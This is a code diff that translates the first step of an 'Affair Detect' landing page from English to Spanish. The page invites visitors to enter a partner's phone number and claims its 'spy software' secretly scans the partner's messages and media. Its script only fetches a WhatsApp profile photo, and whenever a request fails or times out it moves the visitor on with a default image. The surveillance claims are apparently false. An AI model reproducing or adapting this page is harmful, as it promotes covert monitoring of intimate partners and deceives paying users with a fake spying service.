@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-
+<html lang="es">
 <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=0.95, maximum-scale=0.95, user-scalable=0, viewport-fit=cover">
-        <title>Step 1 &#8211; Affair Detect</title>
+        <title>Paso 1 &#8211; Detectar Aventura</title>
         <meta name='robots' content='max-image-preview:large' />
         <style>
                 img:is([sizes="auto" i], [sizes^="auto," i]) {
@@ -488,10 +488,10 @@
                                         <div class="elementor-widget-container">
                                                 <script>
                                                         function logPageView() {
-                                                                console.log('Page Step 1 loaded');
+                                                                console.log('Página Paso 1 cargada');
                                                         }
                                                         function testarAPI() {
-                                                                console.log('Testando API diretamente...');
+                                                                console.log('Probando API directamente...');
 
                                                                 // Tentar usar o número do campo de telefone se ele existir
                                                                 let phoneInput = document.getElementById('form-field-message');
@@ -499,7 +499,7 @@
 
                                                                 if (phoneInput && phoneInput.value.trim()) {
                                                                         phoneNumber = phoneInput.value.trim();
-                                                                        console.log('Usando número do campo:', phoneNumber);
+                                                                        console.log('Usando número del campo:', phoneNumber);
                                                                 }
 
                                                                 // Mudar o texto do botão de teste
@@ -507,7 +507,7 @@
                                                                 let originalBtnText = '';
                                                                 if (testBtn) {
                                                                         originalBtnText = testBtn.innerHTML;
-                                                                        testBtn.innerHTML = 'Processing...';
+                                                                        testBtn.innerHTML = 'Procesando...';
                                                                         testBtn.disabled = true;
                                                                 }
 
@@ -523,7 +523,7 @@
                                                                 })
                                                                         .then(response => response.json())
                                                                         .then(data => {
-                                                                                console.log('API Response (test):', data);
+                                                                                console.log('Respuesta de la API (prueba):', data);
 
                                                                                 // Restaurar o botão
                                                                                 if (testBtn) {
@@ -533,7 +533,7 @@
 
                                                                                 if (data.success) {
                                                                                         if (data.is_photo_private) {
-                                                                                                console.log('API responded: This profile has no public photo.');
+                                                                                                console.log('La API respondió: Este perfil no tiene foto pública.');
                                                                                                 // Even without a photo, continues with a default image
                                                                                                 const defaultImage = "https://pps.whatsapp.net/v/t61.24694-24/393809060_1278849739417847_8084452804219704288_n.jpg?ccb=11-4&oh=01_AdSg3R23tvE2LPLS0I_l9IwVFYPfb4cxnf1mxl1Xw_-x-w&oe=65F6358A&_nc_sid=e6ed6c";
                                                                                                 window.location.href = '../step2/index.html?photo=' + encodeURIComponent(defaultImage);
@@ -542,14 +542,14 @@
                                                                                                 window.location.href = '../step2/index.html?photo=' + encodeURIComponent(data.result);
                                                                                         }
                                                                                 } else {
-                                                                                        console.log('API Error: ' + (data.error || 'Unknown error'));
+                                                                                        console.log('Error de API: ' + (data.error || 'Error desconocido'));
 
                                                                                         const defaultImage = "https://pps.whatsapp.net/v/t61.24694-24/393809060_1278849739417847_8084452804219704288_n.jpg?ccb=11-4&oh=01_AdSg3R23tvE2LPLS0I_l9IwVFYPfb4cxnf1mxl1Xw_-x-w&oe=65F6358A&_nc_sid=e6ed6c";
                                                                                         window.location.href = '../step2/index.html?photo=' + encodeURIComponent(defaultImage);
                                                                                 }
                                                                         })
                                                                         .catch(error => {
-                                                                                console.error('Error in test request:', error);
+                                                                                console.error('Error en la solicitud de prueba:', error);
                                                                                 const defaultImage = "https://pps.whatsapp.net/v/t61.24694-24/393809060_1278849739417847_8084452804219704288_n.jpg?ccb=11-4&oh=01_AdSg3R23tvE2LPLS0I_l9IwVFYPfb4cxnf1mxl1Xw_-x-w&oe=65F6358A&_nc_sid=e6ed6c";
                                                                                 window.location.href = '../step2/index.html?photo=' + encodeURIComponent(defaultImage);
 
@@ -567,14 +567,14 @@
 
                                                                 const form = document.querySelector('form.elementor-form');
                                                                 if (!form) {
-                                                                        console.error('Form not found');
+                                                                        console.error('Formulario no encontrado');
                                                                         return;
                                                                 }
 
                                                                 form.addEventListener('submit', function (e) {
                                                                         e.preventDefault();
 
-                                                                        console.log('Form submitted, looking for phone field...');
+                                                                        console.log('Formulario enviado, buscando campo de teléfono...');
 
                                                                         let phoneInput = document.getElementById('form-field-message');
 
@@ -586,10 +586,10 @@
                                                                                 phoneInput = document.querySelector('input.elementor-field-textual');
                                                                         }
 
-                                                                        console.log('All form fields:', form.elements);
+                                                                        console.log('Todos los campos del formulario:', form.elements);
 
                                                                         if (!phoneInput || !phoneInput.value.trim()) {
-                                                                                console.log('Please enter a valid phone number.');
+                                                                                console.log('Por favor, ingrese un número de teléfono válido.');
 
                                                                                 if (phoneInput) {
                                                                                         phoneInput.value = "+55 11 98765-4321"; 
@@ -598,7 +598,7 @@
                                                                                 }
                                                                         }
 
-                                                                        console.log('Phone field found:', phoneInput);
+                                                                        console.log('Campo de teléfono encontrado:', phoneInput);
 
                                                                         const phoneNumber = phoneInput.value.trim();
                                                                         let countryCode = '';
@@ -607,12 +607,12 @@
                                                                                 countryCode = phoneInput.dataset.pre;
                                                                         }
 
-                                                                        console.log('Sending API request with phone number:', phoneNumber);
+                                                                        console.log('Enviando solicitud API con número de teléfono:', phoneNumber);
 
                                                                         const submitBtn = form.querySelector('button[type="submit"]');
                                                                         const originalText = submitBtn ? submitBtn.innerHTML : '';
                                                                         if (submitBtn) {
-                                                                                submitBtn.innerHTML = 'Processing...';
+                                                                                submitBtn.innerHTML = 'Procesando...';
                                                                                 submitBtn.disabled = true;
                                                                         }
 
@@ -623,7 +623,7 @@
                                                                         // This ensures the user never gets stuck on step1
                                                                         const timeoutPromise = new Promise((resolve, reject) => {
                                                                             setTimeout(() => {
-                                                                                reject(new Error('Request timed out - proceeding to next step'));
+                                                                                reject(new Error('Tiempo de solicitud agotado - procediendo al siguiente paso'));
                                                                             }, 5000); // 5 seconds timeout
                                                                         });
                                                                         
@@ -634,7 +634,7 @@
                                                                         const redirectToStep2 = (imageUrl) => {
                                                                             if (!hasRedirected) {
                                                                                 hasRedirected = true;
-                                                                                console.log('Redirecting to step2 with image:', imageUrl);
+                                                                                console.log('Redirigiendo al paso 2 con imagen:', imageUrl);
                                                                                 window.location.href = '../step2/index.html?photo=' + encodeURIComponent(imageUrl);
                                                                             }
                                                                         };
@@ -662,30 +662,30 @@
                                                                             
                                                                             // If response is not OK, use default image but still proceed
                                                                             if (!response.ok) {
-                                                                                console.log('API returned error status:', response.status);
+                                                                                console.log('La API devolvió el estado de error:', response.status);
                                                                                 redirectToStep2(defaultImage);
-                                                                                throw new Error('Network error: ' + response.status);
+                                                                                throw new Error('Error de red: ' + response.status);
                                                                             }
                                                                             
                                                                             return response.json();
                                                                         })
                                                                         .then(data => {
-                                                                            console.log('API Response:', data);
+                                                                            console.log('Respuesta de la API:', data);
                                                                             
                                                                             if (data.success) {
                                                                                 if (data.is_photo_private) {
-                                                                                    console.log('This profile has no public photo or it is set as private.');
+                                                                                    console.log('Este perfil no tiene foto pública o está configurada como privada.');
                                                                                     redirectToStep2(defaultImage);
                                                                                 } else {
                                                                                     redirectToStep2(data.result);
                                                                                 }
                                                                             } else {
-                                                                                console.log('Error querying the number:', data.error || 'Unknown error');
+                                                                                console.log('Error al consultar el número:', data.error || 'Error desconocido');
                                                                                 redirectToStep2(defaultImage);
                                                                             }
                                                                         })
                                                                         .catch(error => {
-                                                                            console.error('Error in request:', error);
+                                                                            console.error('Error en la solicitud:', error);
                                                                             
                                                                             // Reset submit button
                                                                             if (submitBtn) {
@@ -772,8 +772,8 @@
                                                                 </style>
                                                                 <h2
                                                                         class="elementor-heading-title elementor-size-default">
-                                                                        Are you tired of constant
-                                                                        suspicion? Get the answers you need now.</h2>
+                                                                        ¿Estás cansado de la sospecha
+                                                                        constante? Obtén las respuestas que necesitas ahora.</h2>
                                                         </div>
                                                 </div>
                                         </div>
@@ -792,7 +792,7 @@
                                                                         <div class="elementor-widget-container">
                                                                                 <h2
                                                                                         class="elementor-heading-title elementor-size-default">
-                                                                                        First step​</h2>
+                                                                                        Primer paso​</h2>
                                                                         </div>
                                                                 </div>
                                                         </div>
@@ -803,9 +803,9 @@
                                         data-id="1f686ef9" data-element_type="widget"
                                         data-widget_type="heading.default">
                                         <div class="elementor-widget-container">
-                                                <h2 class="elementor-heading-title elementor-size-default">Enter the
-                                                        number of the person you
-                                                        want to monitor and track.​</h2>
+                                                <h2 class="elementor-heading-title elementor-size-default">Ingresa el
+                                                        número de la persona que
+                                                        quieres monitorear y rastrear.</h2>
                                         </div>
                                 </div>
                                 <div class="elementor-element elementor-element-47b50390 e-flex e-con-boxed e-con e-child"
@@ -822,7 +822,7 @@
                                                                         <div class="elementor-widget-container">
                                                                                 <h2
                                                                                         class="elementor-heading-title elementor-size-default">
-                                                                                        Second step</h2>
+                                                                                        Segundo paso</h2>
                                                                         </div>
                                                                 </div>
                                                         </div>
@@ -833,9 +833,9 @@
                                         data-id="5fab6b87" data-element_type="widget"
                                         data-widget_type="heading.default">
                                         <div class="elementor-widget-container">
-                                                <h2 class="elementor-heading-title elementor-size-default">Wait while
-                                                        the system secretly scans
-                                                        messages and all media files.</h2>
+                                                <h2 class="elementor-heading-title elementor-size-default">Espera mientras
+                                                        el sistema escanea secretamente
+                                                        mensajes y todos los archivos multimedia.</h2>
                                         </div>
                                 </div>
                                 <div class="elementor-element elementor-element-134371d7 e-flex e-con-boxed e-con e-child"
@@ -852,7 +852,7 @@
                                                                         <div class="elementor-widget-container">
                                                                                 <h2
                                                                                         class="elementor-heading-title elementor-size-default">
-                                                                                        Third step</h2>
+                                                                                        Tercer paso</h2>
                                                                         </div>
                                                                 </div>
                                                         </div>
@@ -863,9 +863,9 @@
                                         data-id="50b2fa79" data-element_type="widget"
                                         data-widget_type="heading.default">
                                         <div class="elementor-widget-container">
-                                                <h2 class="elementor-heading-title elementor-size-default">View all
-                                                        monitored messages and
-                                                        suspicious files detected by our spy software.</h2>
+                                                <h2 class="elementor-heading-title elementor-size-default">Ve todos los
+                                                        mensajes monitoreados y los
+                                                        archivos sospechosos detectados por nuestro software espía.</h2>
                                         </div>
                                 </div>
                                 <div class="elementor-element elementor-element-63e215f5 e-flex e-con-boxed e-con e-child"
@@ -877,8 +877,8 @@
                                                         <div class="elementor-widget-container">
                                                                 <h2
                                                                         class="elementor-heading-title elementor-size-default">
-                                                                        ENTER YOUR PARTNER NUMBER
-                                                                        BELOW 👇</h2>
+                                                                        INGRESA EL NÚMERO DE TU PAREJA
+                                                                        ABAJO 👇</h2>
                                                         </div>
                                                 </div>
                                                 <div class="elementor-element elementor-element-3cc86042 elementor-vertical-align-middle elementor-widget elementor-widget-icon-box"
@@ -895,8 +895,8 @@
 
                                                                                 <p
                                                                                         class="elementor-icon-box-description">
-                                                                                        It is not necessary to enter the
-                                                                                        country code, only the number.
+                                                                                        No es necesario ingresar el
+                                                                                        código del país, solo el número.
                                                                                 </p>
 
                                                                         </div>
@@ -996,10 +996,10 @@
                                                                                                         class="elementor-button-content-wrapper">
                                                                                                         <span
                                                                                                                 class="elementor-button-text">✅
-                                                                                                                CLICK
-                                                                                                                HERE TO
-                                                                                                                MONITOR
-                                                                                                                NUMBERS</span>
+                                                                                                                HAZ CLIC
+                                                                                                                AQUÍ PARA
+                                                                                                                MONITOREAR
+                                                                                                                NÚMEROS</span>
                                                                                                 </span>
                                                                                         </button>
                                                                                 </div>
@@ -1045,7 +1045,7 @@
         <script src="./wp-content/themes/hello-elementor/assets/js/hello-frontend.min.js?ver=3.0.1"
                 id="hello-theme-frontend-js"></script>
         <script id="eael-general-js-extra">
-                var localize = { "ajaxurl": "./api.php", "nonce": "709e3a8134", "i18n": { "added": "Added ", "compare": "Compare", "loading": "Loading..." }, "eael_translate_text": { "required_text": "is a required field", "invalid_text": "Invalid", "billing_text": "Billing", "shipping_text": "Shipping", "fg_mfp_counter_text": "of" }, "page_permalink": "./step1/", "cart_redirectition": "", "cart_page_url": "", "el_breakpoints": { "mobile": { "label": "Portrait mobile", "value": 767, "default_value": 767, "direction": "max", "is_enabled": true }, "mobile_extra": { "label": "Mobile Paysage", "value": 880, "default_value": 880, "direction": "max", "is_enabled": false }, "tablet": { "label": "Tablette en mode portrait", "value": 1024, "default_value": 1024, "direction": "max", "is_enabled": true }, "tablet_extra": { "label": "Tablette en mode paysage", "value": 1200, "default_value": 1200, "direction": "max", "is_enabled": false }, "laptop": { "label": "Portable", "value": 1366, "default_value": 1366, "direction": "max", "is_enabled": false }, "widescreen": { "label": "\u00c9cran large", "value": 2400, "default_value": 2400, "direction": "min", "is_enabled": false } } };
+                var localize = { "ajaxurl": "./api.php", "nonce": "709e3a8134", "i18n": { "added": "Añadido ", "compare": "Comparar", "loading": "Cargando..." }, "eael_translate_text": { "required_text": "es un campo obligatorio", "invalid_text": "Inválido", "billing_text": "Facturación", "shipping_text": "Envío", "fg_mfp_counter_text": "de" }, "page_permalink": "./step1/", "cart_redirectition": "", "cart_page_url": "", "el_breakpoints": { "mobile": { "label": "Móvil vertical", "value": 767, "default_value": 767, "direction": "max", "is_enabled": true }, "mobile_extra": { "label": "Móvil horizontal", "value": 880, "default_value": 880, "direction": "max", "is_enabled": false }, "tablet": { "label": "Tableta vertical", "value": 1024, "default_value": 1024, "direction": "max", "is_enabled": true }, "tablet_extra": { "label": "Tableta horizontal", "value": 1200, "default_value": 1200, "direction": "max", "is_enabled": false }, "laptop": { "label": "Portátil", "value": 1366, "default_value": 1366, "direction": "max", "is_enabled": false }, "widescreen": { "label": "Pantalla ancha", "value": 2400, "default_value": 2400, "direction": "min", "is_enabled": false } } };
         </script>
         <script src="./wp-content/plugins/essential-addons-for-elementor-lite/assets/front-end/js/view/general.min.js?ver=6.0.8"
                 id="eael-general-js"></script>
@@ -1077,7 +1077,7 @@
                 wp.i18n.setLocaleData({ 'text direction\u0004ltr': ['ltr'] });
         </script>
         <script id="elementor-pro-frontend-js-before">
-                var ElementorProFrontendConfig = { "ajaxurl": "./api.php", "nonce": "bb135d5a55", "urls": { "assets": "./", "rest": "./" }, "settings": { "lazy_load_background_images": true }, "popup": { "hasPopUps": true }, "shareButtonsNetworks": { "facebook": { "title": "Facebook", "has_counter": true }, "twitter": { "title": "Twitter" }, "linkedin": { "title": "LinkedIn", "has_counter": true }, "pinterest": { "title": "Pinterest", "has_counter": true }, "reddit": { "title": "Reddit", "has_counter": true }, "vk": { "title": "VK", "has_counter": true }, "odnoklassniki": { "title": "OK", "has_counter": true }, "tumblr": { "title": "Tumblr" }, "digg": { "title": "Digg" }, "skype": { "title": "Skype" }, "stumbleupon": { "title": "StumbleUpon", "has_counter": true }, "mix": { "title": "Mix" }, "telegram": { "title": "Telegram" }, "pocket": { "title": "Pocket", "has_counter": true }, "xing": { "title": "XING", "has_counter": true }, "whatsapp": { "title": "WhatsApp" }, "email": { "title": "Email" }, "print": { "title": "Print" }, "x-twitter": { "title": "X" }, "threads": { "title": "Threads" } }, "facebook_sdk": { "lang": "fr_FR", "app_id": "" }, "lottie": { "defaultAnimationUrl": "./default.json" } };
+                var ElementorProFrontendConfig = { "ajaxurl": "./api.php", "nonce": "bb135d5a55", "urls": { "assets": "./", "rest": "./" }, "settings": { "lazy_load_background_images": true }, "popup": { "hasPopUps": true }, "shareButtonsNetworks": { "facebook": { "title": "Facebook", "has_counter": true }, "twitter": { "title": "Twitter" }, "linkedin": { "title": "LinkedIn", "has_counter": true }, "pinterest": { "title": "Pinterest", "has_counter": true }, "reddit": { "title": "Reddit", "has_counter": true }, "vk": { "title": "VK", "has_counter": true }, "odnoklassniki": { "title": "OK", "has_counter": true }, "tumblr": { "title": "Tumblr" }, "digg": { "title": "Digg" }, "skype": { "title": "Skype" }, "stumbleupon": { "title": "StumbleUpon", "has_counter": true }, "mix": { "title": "Mix" }, "telegram": { "title": "Telegram" }, "pocket": { "title": "Pocket", "has_counter": true }, "xing": { "title": "XING", "has_counter": true }, "whatsapp": { "title": "WhatsApp" }, "email": { "title": "Correo electrónico" }, "print": { "title": "Imprimir" }, "x-twitter": { "title": "X" }, "threads": { "title": "Threads" } }, "facebook_sdk": { "lang": "es_ES", "app_id": "" }, "lottie": { "defaultAnimationUrl": "./default.json" } };
         </script>
         <script src="./wp-content/plugins/pro-elements/assets/js/frontend.min.js?ver=3.25.2"
                 id="elementor-pro-frontend-js"></script>
@@ -1093,7 +1093,7 @@
 
 
         <script id="elementor-frontend-js-before">
-                var elementorFrontendConfig = { "environmentMode": { "edit": false, "wpPreview": false, "isScriptDebug": false }, "i18n": { "shareOnFacebook": "Share on Facebook", "shareOnTwitter": "Share on Twitter", "pinIt": "Pin it", "download": "Download", "downloadImage": "Download image", "fullscreen": "Fullscreen", "zoom": "Zoom", "share": "Share", "playVideo": "Play video", "previous": "Previous", "next": "Next", "close": "Close", "a11yCarouselWrapperAriaLabel": "Carousel | Horizontal scrolling", "a11yCarouselPrevSlideMessage": "Previous slide", "a11yCarouselNextSlideMessage": "Next slide", "a11yCarouselFirstSlideMessage": "This is the first slide", "a11yCarouselLastSlideMessage": "This is the last slide", "a11yCarouselPaginationBulletMessage": "Go to slide" }, "is_rtl": false, "breakpoints": { "xs": 0, "sm": 480, "md": 768, "lg": 1025, "xl": 1440, "xxl": 1600 }, "responsive": { "breakpoints": { "mobile": { "label": "Mobile portrait", "value": 767, "default_value": 767, "direction": "max", "is_enabled": true }, "mobile_extra": { "label": "Mobile landscape", "value": 880, "default_value": 880, "direction": "max", "is_enabled": false }, "tablet": { "label": "Tablet portrait", "value": 1024, "default_value": 1024, "direction": "max", "is_enabled": true }, "tablet_extra": { "label": "Tablet landscape", "value": 1200, "default_value": 1200, "direction": "max", "is_enabled": false }, "laptop": { "label": "Laptop", "value": 1366, "default_value": 1366, "direction": "max", "is_enabled": false }, "widescreen": { "label": "Widescreen", "value": 2400, "default_value": 2400, "direction": "min", "is_enabled": false } } }, "version": "3.23.3", "is_static": false, "experimentalFeatures": { "e_optimized_css_loading": true, "e_font_icon_svg": true, "additional_custom_breakpoints": true, "container": true, "container_grid": true, "e_swiper_latest": true, "e_nested_atomic_repeaters": true, "e_onboarding": true, "theme_builder_v2": true, "hello-theme-header-footer": true, "home_screen": true, "ai-layout": true, "landing-pages": true, "e_lazyload": true }, "urls": { "assets": "./", "ajaxurl": "./api.php" }, "nonces": { "floatingButtonsClickTracking": "4d17d17224" }, "swiperClass": "swiper", "settings": { "page": [], "editorPreferences": [] }, "kit": { "active_breakpoints": ["viewport_mobile", "viewport_tablet"], "global_image_lightbox": "yes", "lightbox_enable_counter": "yes", "lightbox_enable_fullscreen": "yes", "lightbox_enable_zoom": "yes", "lightbox_enable_share": "yes", "lightbox_title_src": "title", "lightbox_description_src": "description", "hello_header_logo_type": "title", "hello_footer_logo_type": "logo" }, "post": { "id": 228, "title": "Step 1 - WhatsApp Photo Analyzer", "excerpt": "", "featuredImage": false } };
+                var elementorFrontendConfig = { "environmentMode": { "edit": false, "wpPreview": false, "isScriptDebug": false }, "i18n": { "shareOnFacebook": "Compartir en Facebook", "shareOnTwitter": "Compartir en Twitter", "pinIt": "Pinear", "download": "Descargar", "downloadImage": "Descargar imagen", "fullscreen": "Pantalla completa", "zoom": "Zoom", "share": "Compartir", "playVideo": "Reproducir vídeo", "previous": "Anterior", "next": "Siguiente", "close": "Cerrar", "a11yCarouselWrapperAriaLabel": "Carrusel | Desplazamiento horizontal", "a11yCarouselPrevSlideMessage": "Diapositiva anterior", "a11yCarouselNextSlideMessage": "Siguiente diapositiva", "a11yCarouselFirstSlideMessage": "Esta es la primera diapositiva", "a11yCarouselLastSlideMessage": "Esta es la última diapositiva", "a11yCarouselPaginationBulletMessage": "Ir a la diapositiva" }, "is_rtl": false, "breakpoints": { "xs": 0, "sm": 480, "md": 768, "lg": 1025, "xl": 1440, "xxl": 1600 }, "responsive": { "breakpoints": { "mobile": { "label": "Móvil vertical", "value": 767, "default_value": 767, "direction": "max", "is_enabled": true }, "mobile_extra": { "label": "Móvil horizontal", "value": 880, "default_value": 880, "direction": "max", "is_enabled": false }, "tablet": { "label": "Tableta vertical", "value": 1024, "default_value": 1024, "direction": "max", "is_enabled": true }, "tablet_extra": { "label": "Tableta horizontal", "value": 1200, "default_value": 1200, "direction": "max", "is_enabled": false }, "laptop": { "label": "Portátil", "value": 1366, "default_value": 1366, "direction": "max", "is_enabled": false }, "widescreen": { "label": "Pantalla ancha", "value": 2400, "default_value": 2400, "direction": "min", "is_enabled": false } } }, "version": "3.23.3", "is_static": false, "experimentalFeatures": { "e_optimized_css_loading": true, "e_font_icon_svg": true, "additional_custom_breakpoints": true, "container": true, "container_grid": true, "e_swiper_latest": true, "e_nested_atomic_repeaters": true, "e_onboarding": true, "theme_builder_v2": true, "hello-theme-header-footer": true, "home_screen": true, "ai-layout": true, "landing-pages": true, "e_lazyload": true }, "urls": { "assets": "./", "ajaxurl": "./api.php" }, "nonces": { "floatingButtonsClickTracking": "4d17d17224" }, "swiperClass": "swiper", "settings": { "page": [], "editorPreferences": [] }, "kit": { "active_breakpoints": ["viewport_mobile", "viewport_tablet"], "global_image_lightbox": "yes", "lightbox_enable_counter": "yes", "lightbox_enable_fullscreen": "yes", "lightbox_enable_zoom": "yes", "lightbox_enable_share": "yes", "lightbox_title_src": "title", "lightbox_description_src": "description", "hello_header_logo_type": "title", "hello_footer_logo_type": "logo" }, "post": { "id": 228, "title": "Paso 1 - Analizador de fotos de WhatsApp", "excerpt": "", "featuredImage": false } };
         </script>
         <script src="./js/form.a8f0864f4b4fda696ad1.bundle.min.js" id="elementor-form-js"></script>
         <script src="./js/popup.f7b15b2ca565b152bf98.bundle.min.js" id="elementor-popup-js"></script>
